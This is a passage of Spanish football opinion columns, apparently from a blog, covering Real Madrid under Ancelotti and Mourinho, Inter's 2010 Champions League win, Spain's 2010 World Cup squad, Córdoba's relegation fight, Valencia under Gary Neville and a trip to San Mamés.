cimente sobre el coraje de los socios. Los que siempre han estado ahí. Los que hablarán del equipo mientras tratan de llevarse a la boca un trozo de tortilla servida en plato de plástico. Nos levantamos de Primera con resaca. Pero no por eso vamos a dejar de beber el vino peleón que es nuestro equipo. Directivos responsables, aficionados incansables, jugadores comprometidos. No pido más por el bien del equipo que siento como mío. Como dice el matemático Ian Malcom en Parque Jurásico: “La vida siempre se abre camino”. Por más trabas que le pongan, por más cemento que le echen encima, siempre brota la naturaleza a través de las grietas, escapándose entre las hendiduras. La vida en el Madrid es Cristiano Ronaldo, por más que Benzema o Isco a veces den aire a los partidos, el portugués sigue siendo la válvula de escape de un equipo engarrotado y débil. Ayer, con dos goles, salvó a su equipo de una eliminación que hubiera sido inesperada y terrible.El Madrid no tiene fútbol. El espejismo de los primeros partidos de la temporada era consecuencia de las ganas que había de ver fútbol, puro artificio. Hoy en día: la defensa es acogedora y mullida como un cojín, el centro del campo es tan peligroso como los mordisquitos de un bebe desdentado, la delantera –con un errático Bale– es la puntual asociación entre Benzema y Cristiano, que hacen lo posible en esa islita paradisiaca en la que se han quedado atrapados. Sólo Isco, a veces, consigue que el equipo brille; pero no es suficiente.El partido de ayer fue la imagen de una bañera desbordada, incapaz de contener a un equipo como el Schalke que, con un fútbol aseado, estuvo a punto de levantar un 0-2 y que pese a no pasar de ronda logró ganar marcando cuatro goles en la casa del vigente campeón. Todo puede pasar en un partido europeo, pero ayer daba la sensación de que este aciago encuentro era la prueba definitiva de que el Madrid está en crisis, de que Ancelotti no tiene las riendas del equipo, de que al equipo le falta vocación y entrega. La aparición cuartomilenista de Khedira en el pasillo del mediocampo fue espeluznante, ni James Wan lo hubiera hecho mejor.Al Real Madrid le falta pegamento en las líneas. Kroos está fuera de posición, tapando un agujero que hizo ahí el taladro del mercado. Kroos no es Xabi Alonso y si Khedira, Illara y, de momento, Lucas Silva no están para tapar ese boquete, no es culpa del alemán: exhausto, perdido, invisible. Se espera a Modric. Veremos. A mí Modric me parece un jugador prescindible, al que su entrega incansable le hacen más importante de lo que su fútbol le hace merecer. Recién salido de una larga lesión su físico no podrá esconder su falta de presencia en las zonas calientes del ataque. Ayer jugó sólo unos minutos, imposible juzgarlo.La solución es romper la inviolabilidad de algunos jugadores. El tridente de ataque ha demostrado no ser infalible y habrá que varear un poco el olivo táctico de Ancelotti, cuadriculado y continuista. Kroos debe respirar arriba, Bale debe retrasar su posición y dejar de ser el delantero que nunca llegó a ser, Isco adelantar la posición para dar profundidad al ataque blanco, Lucas Silva entrar en el equipo titular con más galones de los que tiene, acompañado de un Modric que lo hará mejor. En definitiva: el técnico italiano está a tiempo de hacer probaturas con las piezas talentosas de su plantilla, clasificado para cuartos y con opciones aún de ganar la Liga. Como dice Sergio Cortina: que haya que recordarle, precisamente a un técnico italiano, que cuando las cosas van mal dadas el centro del campo tiene que estar perfectamente apuntalado es cosa de poca broma.Hay dos problemas que son tan sobrecogedores como los dos velociraptores de la película que nombro al principio: Casillas y la pareja de centrales. Varane está echándose una siesta a costa de Florentino. Lo que parecía una estrella rutilante se ha convertido en un trozo de piedra mate. La lesión de Ramos hace peor defensa a Pepe, Nacho no ha podido asentarse en el puesto, entre todos suman un central bueno. Ayer el Schalke jugó como quiso, Sané –un jugador aún verde- acorraló la retaguardia, Huntelaar jugó libremente entre líneas. Pases cortos, largos, en profundidad… todo entraba en ese quesito gruyer del Madrid.El otro problema es Iker Casillas. Lo he defendido hasta que me han dado los argumentos. Lo de ayer no lo puede justificar ni una madre. Tiene brazos de mano loca. Parece desconcentrado, ajeno al juego. Le siguen salvando los reflejos –la parada final a Uchida fue redentora-, pero hoy en día no es portero para ganar nada importante. El problema es mirar al banquillo y ver a Keylor Navas. Esa gestión totémica de la plantilla que tanto lastra a los Madrides de Florentino Pérez.Ayer los de Ancelotti miraron el suelo desde la barandilla de la terraza y sintieron vértigo. Estuvo cerca. En Liga los errores parecen menos pero con eliminatorias por delante el desastre es absoluto y esplendoroso.Mucho tiene que darle Ancelotti a la pizarra si quiere activar a los suyos. El laissez faire, laissez passer le obsequió el año pasado muy buen resultado pero este año hay menos ganas de comer y faltan algunos jugadores cuya entrega –Di María, Alonso- salvó algunos muebles y cimentó un vestuario unido. Quizá en mayo nadie se acuerde de este partido. O quizá en un puñado de semanas estos noventa minutos sean como aquella banderola que cae tras el grito del Tiranosaurio en la escena final de Parque Jurásico: una buena metáfora del desastre. Imagen: www.realmadrid.com El Inter ha levantado la Copa de Europa jugando como sabe. Arriba no perdona y en la defensa no pierde la concentración. Un equipo solidario que ha diluido las individualidades, que respira como uno solo, que exprime los minutos y blinda su área como si se les fuera la vida en cada milímetro de hierba. No es un futbol bonito, no tiene la estética del pase, ni la precisión en el centro del campo, es otra cosa. Un bloque, un ejercito futbolístico con mucho oficio y poca, poquísima, improvisación. La táctica por encima del jugador, el equipo por encima de los dorsales. Es emocionante ver a Samuel, Lucio, Cambiasso, apoyándose, cubriéndose las espaldas los unos a los otros, ayudando casi fraternalmente al compañero. Pandev defendiendo en las cercanías de Julio César o Eto´o protegiendo el lateral zurdo. Un mecanismo que ha servido para lograr el triplete. Han ganado todo lo que han jugado. El equipo neroazzurro ha vencido hoy al Bayern poniendo fin a una de las mejores temporadas de su vida. Un protagonista, Diego Milito, que ha resumido con sus dos goles el invencible planteamiento de su técnico. Noventa minutos de presión, noventa minutos de trabajo, noventa minutos de respeto táctico, noventa minutos para alcanzar, por fin, la gloria.Poco fútbol en el Bernabéu esta noche. El Bayern no ha estado a la altura de sus intensas eliminatorias. Robben ha recordado al delantero individualista que vimos en el Madrid. Inserto en la banda pero sin el desborde de otros encuentros, sin finalizar con éxito su jugada estandarte, esa carrera paralela a la portería y el lanzamiento a la escuadra contraria. Demasiados hombres en la fortificación italiana. Muchos rechaces para desanimar al holandés. El mediocampo bávaro naufragando ante Zanetti y Cambiasso. La pareja argentina que ha dejado sin argumentos a un exhausto Van Bommel y un hierático Schweinsteiger. Ni la inclusión del trabajador Altintop ha logrado la imposición del equipo muniqués en las zonas templadas del campo. Así era difícil llegar con claridad al arco rival. Ni Müller ni Olic han podido participar en el juego de su equipo. La entrada de Mario Gómez, menos movilidad aún, y Klose, inédito, han empeorado el panorama. Van Gaal logró, al menos, armar una defensa competente, sin embargo una jugada primitiva ha sido la puerta al primer gol. Saque en largo del guardameta, Milito la baja de cabeza y la pone en los pies de Sneijder, el holandés se la devuelve veloz y regala al argentino un uno contra uno ante Butt. Pequeña finta y gol. Ahí se acabó el partido. Ya sólo necesitaban los interistas dejar pasar los minutos.La reacción del Bayern Munich en la segunda parte fue inexistente. La aglomeración de atacantes facilitó la labor del Inter, acostumbrado a achicar balones y buscar las contras. El hombre por hombre fue intenso en las áreas. En el conjunto alemán todos buscaban a Robben. El balón volaba una y otra vez al costado derecho. Eto´o, enorme su desgaste, enturbiaba el espacio. Lucio y Samuel no dejaban pasar nada. Lo poco que atinaba a portería era neutralizado por el inmenso Julio César. Cuando Diego Milito, tras un regate de ensueño, mandó el balón a la red en el minuto 70 los milaneses se sintieron campeones. La entrada de Stankovic y Muntari asfixió aún más la creación del Bayern, los atenazó a cuarenta metros de su portería. Dejó que hilvanaran el juego romo e inofensivo lejos de la meta. Como ya hicieran con el Barça en la vuelta de semifinales, se abandonaron al tiempo. Renunciaron al balón sabiendo que el equipo rival no estaba en condiciones de asustar a nadie. Apelotonado, lento, sin peligro en las combinaciones, vencido desde hacía un buen rato.Si existe la justicia en el fútbol podemos decir que la victoria del Inter es justa. Han hecho méritos más que de sobra para volver a la élite del fútbol europeo.Podemos debatir lo de siempre. El juego férreo y destructor frente al pase y el control. Mourinho ha demostrado hoy que el triplete no es patrimonio de la estética sino del trabajo. Con hombres como Sneijder, Maicon o Pandev ha logrado rematar un equipo avasallador, sin piedad. Siempre dispuesto a herir, intratable en defensa, brillante en ataque. Once jugadores que actúan como uno solo. Mérito del director de orquesta, mérito de Mourinho. La música no es sólo la suma de muchos instrumentos, es comunicación con el espacio, precisión de los ejecutantes, armonía y sincronía. El resultado: una hermosa maquinaria. Aterra tanto favoritismo. Observar al resto de selecciones desde una atalaya es tan excitante como turbador. Nunca la Selección Española ha partido desde una posición tan adelantada. A este Mundial llegamos como campeonas de Europa, tras una clasificación perfecta, con un juego que mezcla plasticidad con la eficacia, un fútbol bello y goleador. Con pundonor y aquellas cosas que siempre nos acompañaron, pero sobre todo con una apuesta decidida por el toque, la posesión y el hilvanado. Es humano contener la euforia. Empezaremos a creer cuando ruede el balón en el primer partido y veamos que todas las sospechas, que todos los titulares, que todas las alabanzas tienen un reflejo sobre el césped. Hay que asumir algo inédito, es la primera vez que España es favorita. Ni Brasil, ni Argentina, ni Alemania, ni Holanda parecen tener un futuro tan esperanzador. No es garantía de nada. Este deporte es tan miserable que no siempre gana el más guapo. Hemos visto tropelías de todo tipo. Jugar con los pies es lo que tiene, la imprecisión es parte del espectáculo. También el azar. Un día inspirado de los rivales. Demasiadas circunstancias para atenuar lo evidente: el fútbol de España está a un año luz del resto.Hasta nos hemos deshecho de aquello de la “Furia”. Ya no necesitamos esas bravatas que la mayoría de las veces ocultaban la falta de un plan. Ni Juanito ni Camacho. Ahora parece otra cosa, más refinada, La Roja. No es Dolores Ibarruri, es una nueva manera de calificar a un combinado tranquilo, autoconsciente, con aplomo. Lejos de aquella angustia mundialista, del exceso de celo. Tenemos un once al que las lesiones o ausencias no parecen afectar demasiado. Tenemos alternativas en el sistema. Jugamos con más posesión en la media, o volcados en las bandas. Tenemos gol, capacidad defensiva, claridad en la contención. Un reloj en mitad del campo. Sabemos matar los partidos, dejarlos fluir lejos del área.Pero sobre todo tenemos confianza. Ese intangible que, por ejemplificar, hizo campeona a Italia en la última Copa del Mundo. Saber competir, que decían, o no lanzarse atropelladamente hacia el portero contrario. Una estrategia templada, firme, que no varía según el rival. Ahora es el contrario el que debe inventar como jugarnos. Lo que separa a los aspirantes de los favoritos. Elementos diferenciales.El once está prácticamente perfilado. Tras el debate artificial en la portería, será Casillas el titular. Voy a daros argumentos para el linchamiento. Llevo mucho tiempo diciendo, mis compañeros pueden dar fe de ello, que para mí el mejor portero de España es Valdés. Casillas es indiscutiblemente bueno, pero Víctor aporta cosas que el madrileño no suma. Mayor orden en la defensa, sale más y con más convencimiento. El jugador del Barcelona da la sensación de jugar un paso más adelantado que el resto. Más al límite, con mucha presión pero achicando la portería, evitando muchos pases en profundidad. Y además de eso un uno contra uno inexpugnable. Yo no sé como será Valdés en las concentraciones, si polémico o no, pero es un portero mayúsculo. Dicho esto entiendo que, entre iguales, Casillas tenga una experiencia y una aclimatación al puesto que no tienen los advenedizos. Por eso digo que el debate está inflado. Por muy bueno que sea Valdés, que yo lo creo, Iker tiene cogida la medida a ese puesto y su responsabilidad. No es tiempo de probaturas.En la defensa la situación es más plácida. Marchena ya no está al nivel de la Eurocopa y afortunadamente ha crecido un gigante como Piqué. Junto a Puyol marcaran el cerrojo español. Bien conjuntados por la experiencia de clubes, son una garantía. La rapidez e intensidad de uno contra la colocación y el juego por alto del otro. El recambio con Albiol o Marchena reconforta. Centrales con buen toque, salida limpia, y sin miedo a la refriega en el área. En los laterales Ramos y Capdevila. El sevillano ha mejorado tras una pequeña depresión en su juego. Vuelve a ser el futbolista con largo recorrido, con buen centro e inclinación a resolver el mismo la jugada. Eso que tanto gusta de Maicon, no tener miedo a chutar. En la izquierda el jugador del Villarreal, tras un año discreto pero con poca competencia en el puesto. Arbeloa, un diestro, puede discutirle el puesto, pero se pierde mordiente arriba.En el centro del campo se echa en falta Marcos Senna. Yo creo que no estaba para ir a Sudáfrica en un año discreto y con molestias todo el año. Su sustituto, aunque criticado, creo que cumple su labor perfectamente.Busquets ha funcionado como destructor en el mediocampo culé. Aporta menos recursos de vanguardia pero atrás es solidario, rápido, y siempre va al corte. No se achanta, ni desaparece, siempre se muestra. Es como decía hace unos cuantos artículos un jugador subterráneo, de ese otro fútbol. No tiene el disparo del hispano brasileño, ni su toque de balón, pero es una bendición para los laterales. Oprime al rival, lo seca, saca de quicio a los encargados de distribuir del contrario. Agarra, bloca y persigue con un físico inagotable. Y cuando tiene que distribuir no lo hace demasiado mal. Es nuestro Gattusso doméstico. Si fuera italiano todo el mundo lo querría en su equipo. Para que el conjunto funcione es necesario un jugador así. Guardiola lo ha tenido claro toda la temporada. Touré adelantaba su posición porque Sergio atrás es intocable. Para que Xavi e Iniesta jueguen liberados, Busquets tiene que estar detrás mordiendo. Para mí, una pieza fundamental. Xabi Alonso, su compañero, no es un futbolista de cierre. Por más que queramos ver en él virtudes de achique, su tendencia al ataque sería poco adecuada para la contención. El tolosarra rinde mejor con alguien detrás cubriéndole las galopadas, permitiéndole respirar y meditar el pase a los costados. Con Busquets y Alonso, Xavi es la prima donna. El cerebro de España. El principio de todo. Los delanteros juegan para él, los extremos se la piden a él y los mediocampistas le protegen. Por él pasa todo. Máximo culpable del éxito de este equipo. En el banco Javi Martinez, capacitado para hacer de Busquets, aunque con más recorrido, y sobre todo Cesc. Un suplente de oro. Con claridad en el pase como Xavi, con propensión al ataque como Xabi y con el sacrificio defensivo de Busquets. Un recambio para todos que, precisamente por sus muchos roles, no encuentra el sitio exacto en el once titular.En la delantera hay de todo. Tres nueves de área, Villa, Torres y Llorente. Por orden de preferencias de cara a Del Bosque. Y muchos jugadores de banda. Algún extremo puro, como Navas, que será fundamental cuando concurse el delantero del Athletic. Y otros con capacidad para asociarse, para tejer una tela de araña entre mediocampo y delantera. Silva, Mata, Iniesta y Pedro. Futbolistas que ocupan la banda pero que bajan a recibir, que se intercambian con los delanteros, todos con toque exquisito y vocación goleadora. Satélites rondando la portería del rival, desnortando las marcas defensivas del contrario, buscando desmarques, abriendo un abanico de posibilidades para los distribuidores. Mucho gol en las posiciones más adelantadas. Muy difícil de defender para otras selecciones.Un equipo compensando, que busca el equilibrio en todas las líneas.Con salida controlada, con ataques que varían con facilidad. Dominio en corto, superar la presión con la ayuda de los laterales y los jugadores de banda que bajan a recibir. Con un rematador como Villa aprovechándose del desdibujo rival. Una Selección con mayúsculas. Capacitada para ganar el Mundial. Lástima que no juguemos al tenis, o incluso al baloncesto, esos deportes que se juegan con la mano, donde el margen de error es infinitamente más pequeño. Da igual bordar el fútbol, tener claridad en las ideas, confianza. De poco sirve ser un manual viviente de fútbol si juegas a un deporte voluble. Donde puedes irte a casa si el Brasil de Dunga atosiga el juego, si una mediocre Italia te encadena a los delanteros, si Cristiano Ronaldo tiene su día, si Argentina decide que tiene que brillar. En un Mundial hay pocas cosas seguras. Con la Selección de Del Bosque estamos minimizando el riesgo. Somos favoritos, aunque pese. Desde Suiza a la final, un camino que en este Mundial no nos parece algo imposible.Lo mejor: Su juego. Indiscutiblemente la selección con más registros y capacidad del campeonato.Lo peor: Ser los favoritos obliga a los rivales a jugar extramotivados. Partidos duros y asfixiantes.Jugador a seguir: Villa. Es el delantero europeo más en forma del momento.Pronostico de DDF: Campeones. Con el corazón y con el cerebro.La lista de 23:PorterosIker Casillas (Real Madrid)José Manuel Reina (Liverpool/ING)Víctor Valdés (Barcelona)DefensasRaúl Albiol (Real Madrid)Alvaro Arbeloa (Real Madrid)Joan Capdevila (Villarreal)Carlos Marchena (Valencia)Gerard Piqué (Barcelona)Carles Puyol (Barcelona)Sergio Ramos (Real Madrid)CentrocampistasXavi Alonso (Real Madrid)Sergio Busquets (Barcelona)Francesc “Cesc” Fábregas (Arsenal/ING)Andrés Iniesta (Barcelona)Javi Martínez (Athletic Club)Xavi Hernández (Barcelona)DelanterosDavid Jiménez Silva (Valencia)Jesús Navas González (Sevilla)Juan Manuel Mata (Valencia)Pedro Rodríguez (Barcelona)Fernando Llorente (Athletic Club)Fernando Torres (Liverpool/ING)David Villa (Barcelona) Empate a cero tras un partido laborioso, intenso, de los que agotan a los del césped y también un poco a los que vemos el fútbol desde el sofá. Tensión defensiva del Deportivo que ha acabado con el empuje intermitente y deslavazado de un Madrid que alterna buenos partidos con comatosos encuentros como el de hoy. Algo no funciona en el equipo de Mourinho cuando el equipo rival sale bien plantado, sin dejar espacios al siempre dubitativo Özil y tiene que dejar la creación a jugadores insolidarios como Cristiano o Di María, que por muy buenos que sean –y lo son- a veces no pueden ganar partidos solos. Kaká en el once titular no pasa de la anécdota. Su labor ha sido gris, plomiza, ajena al nervio que suele sacudir al Madrid esta temporada y el magnífico jugador que fue sólo pervive en los posters con la camiseta rojinegra.El equipo de Lotina es un equipo muy luchador. No tiene brillantez arriba, ninguna, ni Lassad, ni Riki ni hoy Sand –que eso sí, no ha parado de atosigar en la salida de balón merengue- aportan  el golpe definitivo que debe caracterizar a los delanteros. Guardado, que hoy reaparecía, puede ser la solución a esta negritud ofensiva. Lo poco reseñable que ha hecho el club gallego en vanguardia ha estado firmado por el fino interior mexicano. La posición escorada del otro jugador talentoso del equipo, Adrián, ha deslucido un poco su labor, creo que es más jugador de ataque, más cerca del área es más peligroso. El resto del mérito ha sido de los hombres de atrás, Colotto y Lopo siempre atentos, Laure tapando los carriles junto a Morel y la piña de mediocentros secando a Lass –que ni está ni se le espera, y a un Alonso que no ha dado más de sí en su soledad medular.Los tres puntos pudieron irse a Madrid sobre todo en los minutos finales donde el ataque se multiplicó, en un locurón de alternativas, disparos, rechaces y algunas soberbias intervenciones de Aranzubía que hoy, de nuevo, nos ha mostrado su mejor cara. La pólvora del equipo de Mourinho es innegable, cualquier destello de los de arriba -hoy los palos de Ronaldo y Adebayor– pueden desequilibrar la balanza. Sin embargo hay algo que chirría en la maquinaria del portugués. Todo se soluciona con individualidades, el colectivo parece tener obligaciones sólo de mediocampo hacia atrás. El equipo está junto pero la solidaridad y compensación de los defensas no tiene comparación con la guerrilla de los de arriba, guerrilla que además palidece más si cabe cuando Benzema, que hoy no ha estado acertado y Adebayor, incapaz de hilar una jugada de ataque, no logran materializar las ocasiones.Mérito del Deportivo, que ha jugado como debe jugarse ante equipos de este calibre, con seso, con paciencia y con mucha concentración en la defensa. Si viene el gol, bien, y si no el objetivo es empatar a nada, que es un punto valiosísimo en la igualada lucha por la supervivencia de este año. Mi compañero Borja Barba nos apuntaba hoy que lo normal es que a estas alturas ya hubiera un equipo de esos desahuciados, esta temporada la igualdad en la cola de la clasificación anima a celebrar hasta los empates.El Madrid, por su parte, lleva un par de meses diciéndole adiós a la Liga. El Barcelona está intratable y la Champions  League y la Copa del Rey no convierten la máxima competición nacional en una obligación perentoria. No sé si es relajación, cansancio o hartazgo por la persecución crónica, pero está claro que el Madrid está dejándose el campeonato en estos campos y en junio, cuando el Barça levante el trofeo liguero, sólo tener en las vitrinas la Copa o la Liga de Campeones podrán matizar una nueva temporada a la sombra del equipo de Guardiola. Ayer camino de La Rosaleda mi amigo José María me habló de Innuendo, el último disco de Queen. Defendía, tan apasionado como habitúa, que hay que tener mucho talento para convertir tu último disco en un testimonio vitalista, en una reivindicación de la vida. Sacar fuerzas de quién sabe dónde para acabar con una canción que grita, exaltadamente, que el espectáculo debe continuar. Esta mañana me puse el disco nada más levantarme, y lo hice pensando más en el partido que el Córdoba perdió frente al Málaga que en la muerte de Freddie Mercury.Hoy el cordobesismo viste de luto, como la tercera equipación que llevaban los de Djukic en esa bombonera que ayer fue una tumba. El equipo deambuló como en un cortejo fúnebre. Todos fueron al entierro de la ilusión del aficionado, de esa ingenuidad que nos hacía creer en el milagro de la salvación. La esquina blanquiverde estaba llena de cordobesistas que empezaron animando y acabaron pitando a un equipo que se acercó con timidez a saludar tras el partido. Nadie estaba para fiestas.El Córdoba tiene el mismo juego que hace tres meses: ninguno. Es imposible mantener la categoría con un planteamiento tan romo, tan plano, tan poco entregado a una idea. Djukic ha sido incapaz de motivar a una plantilla confeccionada con retales.Ghilas es una sombra del jugador que marcó aquel histórico gol en Bilbao, Andone juega solo, a Bebé sólo le falta regatear a los jueces de línea, Ekeng es un chiste con botas. Las probaturas constantes, casi psicóticas, de Djukic desarman más que arman, restan más que suman. Ayer fue Luso, inédito últimamente, en el lateral.El serbio lo ha intentado todo y nada funciona. Lo del cuchillo entre los dientes arengó más a los aficionados que a los propios jugadores. El equipo no está, no se le espera, los hinchas están rotos. Ayer nos aplaudieron hasta los aficionados del Málaga. Somos una viuda en un entierro. Estoy cansado de recibir el pésame. Ayer volviendo a mi piso de Málaga, la ciudad en la que vivo, con la bufanda del Córdoba en el cuello como un buey con un pesado yugo recibí los ánimos de los malaguistas que felices volvían a casa. Su desinteresado y espontáneo cariño sólo añadía más peso a mi carga, sólo me recordaba la desdicha, la sombra del perdedor, la condescendencia del que gana. Cosas del fútbol, no es rencor, sólo tristeza. Deje la bufanda en la cama y deseé que allí, tirado, se quedara también el lastre de la desolación, la inquietud de las matemáticas, la esperanza rompiéndose contra el suelo como un vaso.Pero hoy, escuchando el Innuendo de Queen he pensado que quizá lo más inteligente es pensar que el espectáculo debe continuar.Que quedan dos meses y que si hay un deporte donde los milagros existan, ese es este estúpido deporte que se juega con los pies y al que llamamos fútbol. Que sólo el descenso acabará con la fiesta. Quedan once partidos, treinta y tres puntos, mucho miedo en los demás y nada que perder nosotros. No soy idiota ni un iluminado. Sé que es difícil, pero como decía ayer José María cuando salíamos del estadio: “al menos que mueran de pie”. Como Freddie Mercury cantando “mi maquillaje puede estar descascarillándose, pero mi sonrisa aún perdura”. La misma sonrisa de aquella tarde de junio en la que subimos a primera tras más de cuarenta años buceando en las cloacas del fútbol.No sé si debe ser Djukic quien maneje esta barquita a la deriva. No sé si debe jugar Florin siempre o si Ghilas tiene derecho a redimirse. Sólo sé que yo me voy a permitir el lujo de creer. Mientras suena el punteo de Brian May pienso que hay un segundo en el que todo acaba, un segundo que separa la vida de la muerte. Y ese segundo aún no ha llegado. Cuando llegue lloraré como el que más, pero hasta que el árbitro no pite en el partido que acabe con anhelo, con las cuentas, con las cábalas, yo viviré a mi equipo en Primera como merece: con una sonrisa bajo el maquillaje estropeado. Cuando llegue el momento ajustaré cuentas con el Presidente, con los entrenadores, con los jugadores. Ajustaré cuentas con la vida, con mis camisetas y mis bufandas, con mis tardes perdidas, con el dinero de las entradas, con los viajes. Maldeciré cada tarde, pasaré el verano más triste de mi vida, lamentaré la oportunidad perdida. Renegaré si es necesario. Pero hasta entonces, hasta que llegue ese pitido que será como una mortaja sobre nuestros colores, recordaré una canción que habla de la vida como un espectáculo que nunca debe dejar de latir:  “Whatever Happens, I´ll Leave It All To Chance”, en palabras de Queen. El compositor John Cage creó en 1952 una obra titulada 4´33´´. En la partitura no hay notas, ni claves, ni compases. Sólo una orden: guardar silencio. No tocar ningún instrumento durante el tiempo que dure la pieza, dividida en tres movimientos de absolutamente nada. Entre los intérpretes y el público hay un espacio por llenar. Tal era la reflexión de Cage: quizá la obra es lo que sucede mientras no hay música. Cada ruido, accidental o deseado, es parte de la composición. La lluvia en el exterior, la respiración agitada, el ruido de las sillas cuando la gente indignada se marcha, o el silbido que recrimina al intérprete el engaño al que se está viendo sometido tras haber pagado por no escuchar nada.El silbido. Me quedo en esto. Se está llenando la crónica futbolística de reflexiones acerca de los silbidos. De la intensidad, cadencia, origen y destino de los pitos. Se pitan los cambios, los fallos y hasta los aciertos. Se pitan las decisiones técnicas, las asistencias, los pases al portero. Se pita todo que es lo mismo que no pitar nada. El fútbol está envuelto en silbos como las caderas de una garota en el Sambódromo. A veces pienso que la música de los estadios está sobrevalorada. Si no sería mejor el silencio. La libertad de expresión es un derecho, pero el criterio formado es un deber. No podemos pedir expresarnos libremente si no vamos a preocuparnos lo más mínimo en qué decir. A veces pienso que el fútbol es ruido. Un ruido insano y caprichoso. Los pitos me sacan de quicio. Pitar a los nuestros y a los suyos. Pitar al árbitro y a los recogepelotas. Pitar por pitar como quien martillea puerilmente las teclas de un piano. Con esa melodía incómoda y desacompasada. Como un coro en el que cada miembro quiere ser solista y grita más alto que el de al lado.En el Bernabéu últimamente hablan mucho de pitadas. Benzema está ausente, torpe y espeso. Se pita a Benzema porque no hay recambio de Benzema. Se pita a él y a la plantilla. Se pita a Benzema y se pita a la ausencia de Higuaín, incluso. Se pita a Benzema porque no se puede pitar la negociación frustrada de Falcao o Agüero -si las hubo-. Ayer pitaron a Arbeloa. También pitaron en su día a Coentrao o Khedira. Y los locutores advierten, dirigen, interpretan los efluvios de la grada. Suben los micrófonos en el estadio para que suene nítido el enjambre de silbidos. No puedo dejar de pensar en los aficionados al fútbol como a Gremlins viendo Blancanieves en el cine. Espontáneos y azarosos. La donna è mobile. Cambiantes, en el peor de los casos soliviantados y guiados por las corrientes de opinión, por llamarlas de alguna manera elegante.Pensaba ayer en Cage.En esos cuatro minutos y treinta y tres segundos de silencio. De una vacuidad que une íntimamente al público con los músicos, a las gradas con los futbolistas. Y pensaba en el silencio en el campo. Como en un partido italiano a puerta cerrada. Los golpeos al balón, las órdenes desde la banda, los gritos al recibir a una patada. Sonidos del fútbol elevándose sobre los pitos. Sobre los pitos a veces injustos la justicia del sonido real, de lo que sucede en el rectángulo de hierba. Casi cinco minutos de silencio en el que el público pueda pensar a quién pita, por qué pita, si su pitido sale de él mismo o está mediatizado. Si está bien pitar a los jugadores a los que si ganan aplaude. Si está motivando o está hundiendo. Pensar honestamente si su pitido es mejor que el silencio. El Valencia es un equipo que siempre me cayó antipático. Lo confieso aquí amparándome en el derecho que tenemos en España a decir lo que nos de la gana. Es un logro constitucional. Celebrémoslo cada día. De la misma forma que en Twitter me paso el día leyendo vuestras extrañísimas filias futboleras (¿de verdad sois del Southampton y seguís la Liga Australiana?) , deseo que asumáis las fobias de los demás. “El odio es el amor sin los datos suficientes” decía el escritor Richard Bach. Al menos aún no he enseñado las tetas en la Sala de Trofeos ché. Tengo mis límites.Se me conoce mejor por lo que no me gusta que por lo que me gusta. Los odios son irracionales, como la gestión de Peter Lim delegada en Lay Hoon Chan. Su última locura fue dar las riendas de un equipo tan exigente como el Valencia a un ex jugador sin experiencia en los banquillos. Gary Neville llegó a Mestalla con ese aire de turista accidental que aún no ha podido sacudirse del todo.Asocio el Valencia a esos aficionados que se van del estadio antes de que acabe el partido. Subiendo las escaleras y mirando atrás con desprecio. Farfullando insultos a los jugadores y buscando el consuelo en el compañero de huida. Las bufandas cayendo derrotadas por la espalda. El brazo acusador. Esos aficionados que se han hinchado este año de desfilar por los vomitorios antes del pitido final. Seguramente esos cuatro impacientes no representen al resto, pero en la caricatura los rasgos se ven con más claridad.Con Nuno el equipo jugaba poco.Con Neville el equipo no ha jugado a nada. El siete a cero del Barcelona escoció como pelar gambas con un padrastro. Se acumularon las derrotas y creció la crispación en ese intangible llamado “entorno”. El club iba a la deriva y el capitán del barco intentaba explicarlo en rueda de prensa. En inglés, con ese acento capaz de arrancar el gotelé de las paredes, y una seriedad marcial e impostada.Gritarle “borracho” a Parejo y “pesetero” a Negredo, ha sido tan habitual como desayunar en la familia valencianista. Jugadores como Abdennour o Bakkali no han ayudado a templar los ánimos de la afición. Es legítimo, la plantilla no da la cara y el equipo va cuesta abajo en Liga. La pesadilla del descenso les despierta de madrugada entre sudores y espasmos. El inglés errante puede hacer posible lo imposible: conducir a un club como el Valencia, que sólo ha pasado cuatro años de su historia en Segunda, a la categoría de plata de nuestro fútbol.Pues anoche, tras el funeral de casi cada fin de semana, llega el Valencia y en su reencuentro con la competición europea, mete cinco goles en 35 minutos en su estadio. Es lo de menos que el Rapid de Viena sea el equivalente en fútbol a esos luchadores anónimos con bañadores rosas que servían de sparring a El Enterrador, Estaca Dugan y El Poli Loco. Ayer hubo una epifanía en Mestalla, una aparición mariana, la beatificación de Santi Mina. Todo salió bien. A Neville casi se le escapa una sonrisa.Pese a las antipatías, que reitero, empecé a cogerle cariño a Neville. Me gustaba su asertividad en rueda de prensa. Esa gloriosa forma de contar una película que ya habíamos visto, como si en la sala y ante los micrófonos pudiera cambiar cada plano de lo vivido. Como jugador era un lateral bregador con más disciplina que talento. Como comentarista deportivo era el Kapuściński del fútbol: ácido, certero e inteligentísimo en el análisis de las jugadas. Como entrenador de momento es sólo un señor perdido en la costa levantina al que le ha tocado resucitar a un paciente comatoso.Podría ser peor. Podría ser Koeman. Podría ser Djukic o Pizzi. Al menos Neville encontró ayer una aspirina del tamaño del círculo central. Las victorias son terapéuticas, como la cerveza a media mañana o el colacao de antes de dormir. Se aferran a sus asientos los espectadores indignados. ADN valencianista. Esperanzados con ver a su equipo trepar hasta puestos más acordes con su historia y su presupuesto. Experimentos con gaseosa de Singapur. Entrenadores que en su vida han sido entrenadores. Misterios peterlimescos con finales felices. A San Mamés se va sin segundas intenciones, sin dobleces. Como un romero en día de fiesta: a beber y disfrutar hasta que dé la noche y apaguen las luces del campo. Cuando los seguidores de un Córdoba frustrante en Primera nos desplazamos a Bilbao para ver el partido, jamás soñamos con celebrar una victoria. Era diciembre y llovía. Camisetas blanquiverdes conviviendo felizmente con las rojas y blancas del Athletic. Y todos, absolutamente todos los visitantes, mirando el nuevo estadio como turistas despistados. La sensación, ingenua, de haber ido al partido sólo para entender ese paisaje de nuestro fútbol: la de las tardes lluviosas en San Mamés, las del fútbol con barro en las botas.Ese encuentro nos regaló un héroe: Nabil Ghilas. Un delantero argelino cedido por el Oporto. Corpulento, rápido, potente y preciso. En el minuto 23 de partido agarró un balón que se quedó a medias entre Iturraspe y Gurpegui y enfiló la portería de Iraizoz hasta batirlo. Con ese 0-1 aguantó el equipo casi setenta minutos que no se hicieron largos porque disfrutamos cada segundo, cada balón despejado, cada córner, cada pelotazo en la valla publicitaria. No sé cuántas camisetas Acerbis se estamparon la siguiente semana con el 14 de Ghilas. Allí soñamos con voltear la situación en la Liga tras el mal inicio. María y yo nos quedamos en el campo hasta que ya no había nadie.Esperábamos a Galder, que terminaba de trabajar. Las luces se iban apagando con fogonazos que luego se convertían en oscuridad. Bajamos al césped. “No podéis pisarlo”, 